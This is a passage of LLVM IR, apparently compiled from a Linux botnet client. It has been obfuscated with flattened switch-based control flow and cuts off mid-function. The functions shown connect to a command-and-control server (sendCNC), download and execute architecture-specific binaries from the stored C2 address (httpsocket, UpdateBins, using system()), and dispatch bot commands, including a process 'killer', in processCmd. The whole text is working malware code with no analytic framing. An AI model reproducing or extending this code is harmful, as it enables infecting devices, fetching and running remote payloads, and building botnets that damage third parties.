  %121 = load i32, i32* %7, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %7, align 4
  store i32 -2005506097, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %120, %119, %118, %108, %39, %31, %30, %26, %21, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %switchVar = alloca i32
  store i32 1997319910, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1997319910, label %22
    i32 1704408395, label %27
    i32 -1889442196, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  %26 = select i1 %25, i32 1704408395, i32 -1889442196
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %28, i32* %8, align 4
  %29 = load i32, i32* %8, align 4
  %30 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 16)
  %32 = call i32 @sleep(i32 1)
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  store i32 1997319910, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %27, %22, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @findwritedir() #0 {
  %.reg2mem = alloca %struct.__dirstream*
  %1 = alloca i32, align 4
  %2 = alloca %struct.killerinfo*, align 8
  %3 = alloca %struct.__dirstream*, align 8
  %4 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i32 0, i32 0))
  store %struct.__dirstream* %4, %struct.__dirstream** %.reg2mem
  %.reload2 = load volatile %struct.__dirstream*, %struct.__dirstream** %.reg2mem
  store %struct.__dirstream* %.reload2, %struct.__dirstream** %3, align 8
  %switchVar = alloca i32
  store i32 -2029898292, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2029898292, label %first
    i32 1291981716, label %7
    i32 153748171, label %12
    i32 -1197739534, label %16
    i32 1372595194, label %21
    i32 -811071337, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.__dirstream*, %struct.__dirstream** %.reg2mem
  %5 = icmp eq %struct.__dirstream* %.reload, null
  %6 = select i1 %5, i32 1291981716, i32 153748171
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %9 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %8, i32 0, i32 0
  %10 = load i8*, i8** %9, align 8
  %11 = call i8* @strcpy(i8* %10, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  store i32 -811071337, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i32 0, i32 0))
  store %struct.__dirstream* %13, %struct.__dirstream** %3, align 8
  %14 = icmp eq %struct.__dirstream* %13, null
  %15 = select i1 %14, i32 -1197739534, i32 1372595194
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %18 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %17, i32 0, i32 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strcpy(i8* %19, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  store i32 -811071337, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -811071337, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %1, align 4
  ret i32 %23

loopEnd:                                          ; preds = %21, %16, %12, %7, %first, %switchDefault
  br label %loopEntry
}

declare %struct.__dirstream* @opendir(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %3 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  %4 = load i8*, i8** %2, align 8
  %5 = call i8* @strcpy(i8* %3, i8* %4) #2
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  ret i8* %6
}

; Function Attrs: noinline nounwind uwtable
define i32 @httpsocket(i8*, i32, i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [128 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %15, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = load i32, i32* %7, align 4
  %23 = trunc i32 %22 to i16
  %24 = call zeroext i16 @htons(i16 zeroext %23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i8*, i8** %6, align 8
  %27 = call i32 @inet_addr(i8* %26) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 577, i32 511)
  store i32 %31, i32* %13, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %32, i32* %12, align 4
  %33 = load i32, i32* %12, align 4
  store i32 %33, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1650333109, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1650333109, label %first
    i32 1757548897, label %36
    i32 -1454713767, label %40
    i32 -1565836520, label %41
    i32 -1995956699, label %47
    i32 -263236394, label %48
    i32 -1945951932, label %74
    i32 669641116, label %75
    i32 1444150059, label %76
    i32 -2103016332, label %80
    i32 2054691357, label %87
    i32 974123143, label %88
    i32 -421880212, label %94
    i32 1349229311, label %96
    i32 67693562, label %104
    i32 740692891, label %105
    i32 1367695947, label %111
    i32 -1306030598, label %116
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %34 = icmp eq i32 %.reload, -1
  %35 = select i1 %34, i32 -1454713767, i32 1757548897
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %13, align 4
  %38 = icmp eq i32 %37, -1
  %39 = select i1 %38, i32 -1454713767, i32 -1565836520
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1306030598, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %12, align 4
  %43 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  store i32 %44, i32* %14, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -1995956699, i32 -263236394
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1306030598, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %16, align 8
  %50 = call i8* @strcpy(i8* %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0)) #2
  %51 = load i8*, i8** %16, align 8
  %52 = load i8*, i8** %16, align 8
  %53 = call i64 @strlen(i8* %52) #10
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8*, i8** %8, align 8
  %56 = call i8* @strcpy(i8* %54, i8* %55) #2
  %57 = load i8*, i8** %16, align 8
  %58 = load i8*, i8** %16, align 8
  %59 = call i64 @strlen(i8* %58) #10
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = call i8* @strcpy(i8* %60, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i32 0, i32 0)) #2
  %62 = load i8*, i8** %16, align 8
  %63 = call i64 @strlen(i8* %62) #10
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %12, align 4
  %66 = load i8*, i8** %16, align 8
  %67 = load i32, i32* %17, align 4
  %68 = sext i32 %67 to i64
  %69 = call i64 @write(i32 %65, i8* %66, i64 %68)
  %70 = load i32, i32* %17, align 4
  %71 = sext i32 %70 to i64
  %72 = icmp ne i64 %69, %71
  %73 = select i1 %72, i32 -1945951932, i32 669641116
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1306030598, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 1444150059, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %15, align 4
  %78 = icmp ne i32 %77, 218762506
  %79 = select i1 %78, i32 -2103016332, i32 -421880212
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %12, align 4
  %82 = call i64 @read(i32 %81, i8* %18, i64 1)
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %19, align 4
  %84 = load i32, i32* %19, align 4
  %85 = icmp ne i32 %84, 1
  %86 = select i1 %85, i32 2054691357, i32 974123143
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1306030598, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %15, align 4
  %90 = shl i32 %89, 8
  %91 = load i8, i8* %18, align 1
  %92 = sext i8 %91 to i32
  %93 = or i32 %90, %92
  store i32 %93, i32* %15, align 4
  store i32 1444150059, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i32 0, i32 0))
  store i32 1349229311, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %12, align 4
  %98 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %99 = call i64 @read(i32 %97, i8* %98, i64 128)
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %20, align 4
  %101 = load i32, i32* %20, align 4
  %102 = icmp sle i32 %101, 0
  %103 = select i1 %102, i32 67693562, i32 740692891
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 1367695947, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %13, align 4
  %107 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %108 = load i32, i32* %20, align 4
  %109 = sext i32 %108 to i64
  %110 = call i64 @write(i32 %106, i8* %107, i64 %109)
  store i32 1349229311, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %12, align 4
  %113 = call i32 @close(i32 %112)
  %114 = load i32, i32* %13, align 4
  %115 = call i32 @close(i32 %114)
  store i32 1, i32* %5, align 4
  store i32 -1306030598, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %5, align 4
  ret i32 %117

loopEnd:                                          ; preds = %111, %105, %104, %96, %94, %88, %87, %80, %76, %75, %74, %48, %47, %41, %40, %36, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %.reg2mem = alloca i32
  %1 = alloca %struct.killerinfo*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = call i32 @findwritedir()
  %5 = load %struct.killerinfo*, %struct.killerinfo** %1, align 8
  %6 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %5, i32 0, i32 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i32 @chdir(i8* %7) #2
  %9 = load i8*, i8** %2, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %11 = load i8*, i8** %2, align 8
  %12 = call i8* @getArch()
  %13 = call i8* @strcpy(i8* %11, i8* %12) #2
  %14 = load i8*, i8** @cncip, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @httpsocket(i8* %14, i32 80, i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -240980284, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -240980284, label %first
    i32 -1940563644, label %19
    i32 -742769519, label %20
    i32 -785411080, label %22
    i32 -1856638545, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 0
  %18 = select i1 %17, i32 -1940563644, i32 -742769519
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  store i32 -785411080, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  store i32 -1856638545, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i8*, i8** %3, align 8
  %24 = call i8* @strcpy(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0)) #2
  %25 = load i8*, i8** %3, align 8
  %26 = load i8*, i8** %3, align 8
  %27 = call i64 @strlen(i8* %26) #10
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = call i8* @strcpy(i8* %28, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0)) #2
  %30 = load i8*, i8** %3, align 8
  %31 = load i8*, i8** %3, align 8
  %32 = call i64 @strlen(i8* %31) #10
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = call i8* @strcpy(i8* %33, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i32 0, i32 0)) #2
  %35 = load i8*, i8** %3, align 8
  %36 = call i32 @system(i8* %35)
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i32 0, i32 0))
  %39 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  store i32 -1856638545, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %22, %20, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i32, align 4
  %43 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  store i32 %47, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1842826952, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1842826952, label %first
    i32 830503246, label %50
    i32 331433445, label %53
    i32 2121961780, label %60
    i32 36150880, label %64
    i32 -164640782, label %71
    i32 -1590121590, label %78
    i32 1897673734, label %82
    i32 262824933, label %89
    i32 1095791709, label %93
    i32 1975320745, label %94
    i32 -34933017, label %101
    i32 1479019776, label %106
    i32 1899592520, label %113
    i32 -1550206492, label %117
    i32 785827801, label %124
    i32 -1935760119, label %131
    i32 751671766, label %132
    i32 -1008339136, label %148
    i32 -1873463208, label %151
    i32 -1288330522, label %155
    i32 -1688201804, label %159
    i32 -322499651, label %163
    i32 -2058170807, label %165
    i32 176401479, label %166
    i32 2079122627, label %170
    i32 493923904, label %171
    i32 222367912, label %175
    i32 1692686245, label %176
    i32 -2095561850, label %183
    i32 1674735885, label %187
    i32 -1295283856, label %194
    i32 -1432526474, label %201
    i32 -584488404, label %202
    i32 -441322785, label %218
    i32 -725235892, label %221
    i32 78527182, label %225
    i32 189418964, label %229
    i32 -1018737839, label %235
    i32 1180784920, label %237
    i32 -186183903, label %238
    i32 2040993452, label %242
    i32 -106588987, label %243
    i32 1301452832, label %247
    i32 1878747336, label %248
    i32 108802993, label %255
    i32 -1571751, label %259
    i32 -644265700, label %266
    i32 -1461029919, label %273
    i32 -290168008, label %280
    i32 -1506286190, label %287
    i32 -416243529, label %294
    i32 1116875253, label %301
    i32 251477155, label %308
    i32 -1127651954, label %312
    i32 1329208951, label %319
    i32 1318802740, label %320
    i32 896416652, label %343
    i32 -1100052341, label %348
    i32 -688546735, label %349
    i32 2055569924, label %353
    i32 579200239, label %358
    i32 -879819037, label %359
    i32 -2090205264, label %363
    i32 -126832666, label %368
    i32 1152147996, label %369
    i32 1618347136, label %374
    i32 -1739938141, label %377
    i32 -805448324, label %381
    i32 -943000627, label %385
    i32 -1923202168, label %394
    i32 1643718334, label %396
    i32 1385950788, label %397
    i32 -674709576, label %401
    i32 -293377388, label %410
    i32 1897701273, label %411
    i32 -471532374, label %412
    i32 322386206, label %419
    i32 1773236630, label %423
    i32 1472382242, label %430
    i32 -656704508, label %437
    i32 -1051924170, label %444
    i32 849674183, label %451
    i32 -2043050736, label %455
    i32 -1982642409, label %462
    i32 -704609181, label %466
    i32 -2053973789, label %473
    i32 -1133103238, label %474
    i32 1855096858, label %496
    i32 -906247637, label %501
    i32 662641959, label %502
    i32 1896834702, label %506
    i32 -512108581, label %511
    i32 547135052, label %512
    i32 681804781, label %517
    i32 1313184186, label %520
    i32 -565092020, label %524
    i32 -453880758, label %528
    i32 858895709, label %536
    i32 -1474179412, label %538
    i32 671613511, label %539
    i32 -692684766, label %543
    i32 1721013200, label %551
    i32 1846837237, label %552
    i32 -1772487591, label %553
    i32 -1883761911, label %560
    i32 -179292727, label %564
    i32 -377783635, label %571
    i32 458308145, label %578
    i32 1143396401, label %579
    i32 644302380, label %595
    i32 -1566457759, label %598
    i32 6215105, label %602
    i32 -1337235576, label %607
    i32 1126885746, label %608
    i32 1898883463, label %612
    i32 -323104359, label %613
    i32 -174783096, label %620
    i32 543731470, label %624
    i32 -534250683, label %631
    i32 -1647946313, label %638
    i32 1892124076, label %639
    i32 -1960829724, label %655
    i32 2082289827, label %658
    i32 1987812169, label %662
    i32 -634059635, label %666
    i32 -1931888448, label %672
    i32 -1624482372, label %674
    i32 -556808015, label %675
    i32 -2029736465, label %679
    i32 -921439589, label %680
    i32 -1134280244, label %684
    i32 -21269822, label %685
    i32 119654963, label %692
    i32 564445092, label %696
    i32 1137182680, label %703
    i32 -781789792, label %710
    i32 1166645923, label %711
    i32 977772929, label %727
    i32 604535064, label %730
    i32 -1113970733, label %734
    i32 1407654431, label %739
    i32 1988226918, label %740
    i32 697373760, label %744
    i32 715514632, label %745
    i32 -726871809, label %752
    i32 358632609, label %753
    i32 1865306384, label %758
    i32 1692374672, label %765
    i32 -615542287, label %773
    i32 745544530, label %781
    i32 1069656305, label %782
    i32 -595948616, label %785
    i32 706731464, label %789
    i32 -6113421, label %793
    i32 -445286146, label %796
    i32 682049662, label %797
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %48 = icmp ne i32 %.reload, 0
  %49 = select i1 %48, i32 331433445, i32 830503246
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* @mainCommSock, align 4
  %52 = call i32 (i32, i8*, ...) @sockprintf(i32 %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0))
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 36150880, i32 2121961780
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @UpdateBins()
  %61 = load i32, i32* @pgid, align 4
  %62 = mul nsw i32 %61, -1
  %63 = call i32 @kill(i32 %62, i32 9) #2
  call void @exit(i32 0) #14
  unreachable

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 0
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0)) #10
  %69 = icmp ne i32 %68, 0
  %70 = select i1 %69, i32 1975320745, i32 -164640782
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @strcmp(i8* %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #10
  %76 = icmp ne i32 %75, 0
  %77 = select i1 %76, i32 1897673734, i32 -1590121590
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = call i32 (...) @killer_kill()
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i32 0, i32 0))
  store i32 1897673734, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8**, i8*** %4, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 1
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @strcmp(i8* %85, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0)) #10
  %87 = icmp ne i32 %86, 0
  %88 = select i1 %87, i32 1095791709, i32 262824933
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = call i32 (...) @killer_init()
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = call i32 (i32, i8*, ...) @sockprintf(i32 %91, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i32 0, i32 0))
  store i32 1095791709, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @strcmp(i8* %97, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i32 0, i32 0)) #10
  %99 = icmp ne i32 %98, 0
  %100 = select i1 %99, i32 1479019776, i32 -34933017
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %104 = call i8* @inet_ntoa(i32 %103) #2
  %105 = call i32 (i32, i8*, ...) @sockprintf(i32 %102, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* %104)
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i32 0, i32 0)) #10
  %111 = icmp ne i32 %110, 0
  %112 = select i1 %111, i32 1692686245, i32 1899592520
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %3, align 4
  %115 = icmp slt i32 %114, 4
